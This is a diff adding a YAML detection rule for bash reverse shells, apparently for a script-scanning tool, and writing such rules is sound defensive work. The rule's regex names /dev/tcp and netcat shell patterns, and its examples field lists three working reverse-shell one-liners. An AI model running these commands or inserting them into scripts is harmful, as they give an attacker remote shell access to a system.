@@ -1,0 +1,32 @@
+# Bash Pattern: Reverse Shell
+# Detects common bash reverse shell patterns
+
+id: BASH-001
+name: Bash Reverse Shell Pattern
+description: |
+  Detects common bash reverse shell patterns using /dev/tcp, nc (netcat), or bash
+  redirection. These patterns are frequently used by attackers to establish remote
+  access to compromised systems. Includes detection of both /dev/tcp connections
+  and netcat-based shells.
+languages:
+  - bash
+detection_type: regex
+detection_logic: '(?:/dev/tcp/[\d\.]+/\d+|nc\s+-[lve]+\s+[\d\.]+\s+\d+|bash\s+-i\s+>&\s+/dev/tcp/)'
+severity: Critical
+mitre_technique: T1059.004
+confidence: 0.95
+category: command_injection
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-15"
+  references:
+    - "https://attack.mitre.org/techniques/T1059/004/"
+  tags:
+    - bash
+    - reverse-shell
+    - remote-access
+  examples:
+    - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    - "nc -e /bin/bash 192.168.1.100 4444"
+    - "0<&196;exec 196<>/dev/tcp/10.0.0.1/4444"
